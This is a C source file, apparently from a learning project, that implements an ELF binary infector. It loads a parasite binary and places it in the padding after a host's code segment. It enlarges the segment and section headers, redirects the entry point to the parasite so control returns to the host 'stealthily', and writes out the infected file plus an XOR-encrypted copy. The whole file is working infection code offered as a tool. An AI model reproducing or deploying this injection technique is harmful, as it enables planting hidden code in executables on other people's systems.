#include "wwp.h"
#include "color.h"

/********************  ALGORITHM   *********************


--- Load parasite from file into memory
1.	Get parasite_size and parasite_code addresss (location in allocated memory)


--- Find padding_size between CODE segment and the NEXT segment after CODE segment
2.	CODE segment : increase
		-> p_filesz 		(by parasite size)
		-> p_memsz 			(by parasite size)
	Get and Set respectively,	
	padding_size 	= (offset of next segment (after CODE segment)) - (end of CODE segment)
	parasite_offset = (end of CODE segment) or (end of last section of CODE segment)


---	PATCH Host entry point
3.	Save original_entry_point (e_entry) and replace it with parasite_offset


--- PATCH SHT
4.  Find the last section in CODE Segment and increase - 
        -> sh_size          (by parasite size)


--- PATCH Parasite offset
5.	Find and replace Parasite jmp exit addresss with original_entry_point 0x????????


---	Inject Parasite to Host @ host_mapping
6.	Inject parasite code to (host_mapping + parasite_offset)


7.	Write infection to disk x_x

*/

Elf64_Addr		parasite_load_address;			// parasite entry point (if parasite is LSB EXEC)
Elf64_Off		parasite_offset;				// Parasite entry point (if parasite is .so)
u_int64_t		parasite_size;					
int8_t			*parasite_code;					// Parasite residence (in memory before meeting its host )

Elf64_Addr		original_entry_point;			// Host entry point
Elf64_Off		code_segment_end_offset;		// Location to inject parasite
u_int64_t   		host_file_size;					// Host binary size (on disk)

int				HOST_IS_EXECUTABLE 		= 0;	// Host is LSB Executable
int 			HOST_IS_SHARED_OBJECT 	= 0;	// Host is a Shared Object

// Finds the placeholder (for address where our parasite code will jump after executing its body) and
// writes the host's entry point (original entry point address) to it. This should silently transfer
// the code flow to the original intended code after the parasite body executes.
void mFindAndReplace(u_int8_t *parasite, long find_value, long replace_value)
{
	u_int8_t *ptr = parasite;
	

	int i	= 0;
	for (i=0 ; i < parasite_size ; ++i)
	{
		long current_QWORD = *((long *)(ptr + i));
		
		if ( !(find_value ^ current_QWORD) ) 
		{
			*((long *)(ptr + i)) = replace_value;
			return;
		}
	}
}

// Patch SHT (i.e. find the last section of CODE segment and increase its size by parasite_size)
void mPatchSHT(void *map_addr)
{
	Elf64_Ehdr	*elf_header 	= (Elf64_Ehdr *) map_addr;
	
	
	Elf64_Off	sht_offset 		= elf_header->e_shoff;
	u_int16_t	sht_entry_count	= elf_header->e_shnum;
    Elf64_Off	current_section_end_offset;


    // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
    Elf64_Shdr *section_entry = (Elf64_Shdr *) (map_addr + sht_offset);


    int i;
    for ( i=0 ; i < sht_entry_count ; ++i )
    {
		current_section_end_offset = section_entry->sh_offset + section_entry->sh_size;

        if ( code_segment_end_offset == current_section_end_offset) {

            // This is the last section of CODE Segment
			// Increase the sizeof this section by a parasite_size to accomodate parasite
            section_entry->sh_size = section_entry->sh_size + parasite_size;
			return;
		} 
    // Move to the next section entry
    ++section_entry;
    }
}

// Returns gap size (accomodation for parasite code in padding between CODE segment and next segment 
// after CODE segment) 
Elf64_Off mGetPaddingSize(void *host_mapping)
{   
	Elf64_Ehdr *elf_header 		= (Elf64_Ehdr *) host_mapping;
	u_int16_t pht_entry_count 	= elf_header->e_phnum;
	Elf64_Off pht_offset 		= elf_header->e_phoff;


	// Point to first entry in PHT
	Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(host_mapping + pht_offset);


	// Parse PHT entries
	u_int16_t CODE_SEGMENT_FOUND = 0;
	int i;
	for ( i = 0 ; i < pht_entry_count ; ++i)
	{
		// PF_X	(1 << 0)
		// PF_W	(1 << 1)
		// PF_R (1 << 2)
		// Find the CODE Segment (containing .text section)
		if (CODE_SEGMENT_FOUND  == 0		&&
			phdr_entry->p_type  == PT_LOAD	&&
			phdr_entry->p_flags == (PF_R | PF_X) )
		{

			CODE_SEGMENT_FOUND = 1;

			// Calculate the offset where the code segment ends to bellow calculate padding_size 
			code_segment_end_offset	= phdr_entry->p_offset + phdr_entry->p_filesz;
			parasite_offset			= code_segment_end_offset;
			parasite_load_address	= phdr_entry->p_vaddr  + phdr_entry->p_filesz;


			// Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
			phdr_entry->p_filesz = phdr_entry->p_filesz + parasite_size;
			phdr_entry->p_memsz  = phdr_entry->p_memsz  + parasite_size;
        
		}

		
		// Find next segment after CODE Segment and calculate padding size
		if (CODE_SEGMENT_FOUND  == 1		&&
			phdr_entry->p_type  == PT_LOAD	&&
			phdr_entry->p_flags == (PF_R | PF_W))
		{
			// Return padding_size (maximum size of parasite that host can accomodate in its 
			// padding between the end of CODE segment and start of next loadable segment)
			return (phdr_entry->p_offset - parasite_offset);
		}


        ++phdr_entry;	
	}

	return 0;
}

// Loads parasite code into memory and defines parasite_code and parasite_size variables
void mLoadParasite(char *parasite_path)
{
	
	// Open parasite code
	int parasite_fd = open(parasite_path, O_RDONLY);
	if (parasite_fd == -1)
	{
		printf("[-] In evil_elf.c - mLoadParasite(), open():");
		exit(0x60);
	}


	// Get the parasite_size using lstat() syscall
	struct stat statbuf;
	if ( lstat(parasite_path, &statbuf) != 0 )
	{
		printf("[-] In evil_elf.c - mLoadParasite(), lstat():");
		exit(0x61);		
	} 


	// Initializing parasite_size and allocating space for parasite_code
	parasite_size = statbuf.st_size;
	parasite_code = (int8_t *)malloc(parasite_size);
	if (parasite_code == NULL)
	{
		fprintf(stderr, "[-] evil_elf.c, InjectParasiteCode() : Out of memory\n");
		exit(0x61);
	}


	// Load actual poison @ parasite_code (allocated memory on heap)
	int bytes_read = read(parasite_fd, parasite_code, parasite_size);
	if (bytes_read == -1)
	{
		printf(RED"[-]"RESET" In evil_elf.c, mLoadParasite() - read():");
		exit(0x62);
	}

	close(parasite_fd);
}

int			write_woody(char *ptr, off_t size)
{
	(void)size;

	// Identify the binary & SKIP Relocatable, files and 32-bit class of binaries
	Elf64_Ehdr *host_header = (Elf64_Ehdr *) ptr;
    if ( host_header->e_type == ET_REL ||
         host_header->e_type == ET_CORE ) return 0;
	else if ( host_header->e_type == ET_EXEC ){	HOST_IS_EXECUTABLE = 1; HOST_IS_SHARED_OBJECT = 0;}
	else if ( host_header->e_type == ET_DYN  ){	HOST_IS_SHARED_OBJECT = 1; HOST_IS_EXECUTABLE = 0;}
    if ( host_header->e_ident[EI_CLASS] == ELFCLASS32 ) return 0;

	
	// Load Parasite into memory (from disk), uses extern 'parasite_path_for_exec' defined in main.c implicitly
	if 		(HOST_IS_EXECUTABLE) 	mLoadParasite("./obj/ASM/exec_parasite.bin");
	else if (HOST_IS_SHARED_OBJECT) mLoadParasite("./obj/ASM/so_parasite.bin");

	if 		(HOST_IS_EXECUTABLE) 	printf("parasite_path_for_exec\n");
	else if (HOST_IS_SHARED_OBJECT) printf("parasite_path_for_so\n");


	// Get Home size (in bytes) of parasite residence in host
	// and check if host's home size can accomodate a parasite this big in size
	Elf64_Off padding_size = mGetPaddingSize(ptr);
	if (padding_size < parasite_size)
	{
		fprintf(stderr, RED"[+]"RESET" Host "YELLOW"%s"RESET" cannot accomodate parasite, parasite is angry "RED"x_x \n"RESET, "le fichier"); 
		return 0;
	}
	

	// Save original_entry_point of host and patch host entry point with parasite_offset
	original_entry_point 		= host_header->e_entry; 
	if (HOST_IS_EXECUTABLE)
		host_header->e_entry 	= parasite_load_address;
	else if (HOST_IS_SHARED_OBJECT)
		host_header->e_entry 	= parasite_offset;


	// Patch SHT
	mPatchSHT(ptr);


	// ?????????????????????????????????????????????????????????????????????????????????????????????
	// Patch Parasite jmp-on-exit address. This step causing SIGSEGV. Since nearly all binaries are
	// in the form of shared objects (which uses offsets instead of absolute addresses), we need to
	// figure out the runtime address (rather than offset) of the first instruction the host 
	// originally intended to execute at RUNTIME. This has to be calculated by our parasite code at
	// RUNTIME since all modern systems come with mitigation called ASLR due to which the binary has
	// a different runtime address each time it is loaded into memory.
	// POSSIBLE Solution -  Parasite should include code that figures out what base address is the 
	//						binary alloted at runtime so that it transfers the code back to the host
	//						stealthily.						
	if (HOST_IS_EXECUTABLE) mFindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
	else if (HOST_IS_SHARED_OBJECT) {
		// Different case for SO - In case our parasite has more placeholders for so infection.
		mFindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
	}
		
	// ????????????????????????????????????????????????????????????????????????????????????????????


	// Inject parasite in Host
	ft_memmove( (ptr + parasite_offset), parasite_code, parasite_size);
	//DumpMemory(ptr + parasite_offset, parasite_size);
	int fd;
	if ((fd = open("woody", O_WRONLY | O_CREAT | O_TRUNC, 0644)) == -1)
		return (1);
	write(fd, ptr, size);
	close(fd);


	char	encryptedName[] = "encrypted";
	char	key[] = "pasta";
	int	enfd;
	char	*filestring = (char *)malloc(size);
	ft_memmove(filestring, ptr, size);
	if ((enfd = open(encryptedName, O_WRONLY | O_CREAT | O_TRUNC, 0644)) == -1)
	{
		fprintf(stderr, "couldn't make encryption file\n");
		return (1);
	}

	int keysize = ft_strlen(key);
	char a = 'a', b = ' ';
	printf("%c (0x%x) ^ %c (0x%x) => %c (0x%x)\n", a, (int)a, b, (int)b, a ^ b, (int)(a ^ b));
	printf("e_entry = %d, parasite size = %d, file size = %d\n", host_header->e_entry, parasite_size, size);
	for (int i = 0; i < size; i++)
	{
		//printf("%d ", i);
		filestring[i] ^= key[i % keysize];
	}
	//POUR L'INSTANT ENCRIPTE TOUT L'EXECUTABLE "encrypted" a partir d'une copie de woody
	//for (int i = host_header->e_entry  + parasite_size; i < size; i++)
        //	filestring[i] ^= key[i % keysize];


	write(enfd, filestring, size);
	close(enfd);
	free(filestring);
	printf("key: %s\n", key);


	// DEBUG
	// fprintf(stdout, BLUE"[+]"RED" Infected x_x"RESET"  :  "GREEN"%s\n"RESET, filepath);

	return 0;
}
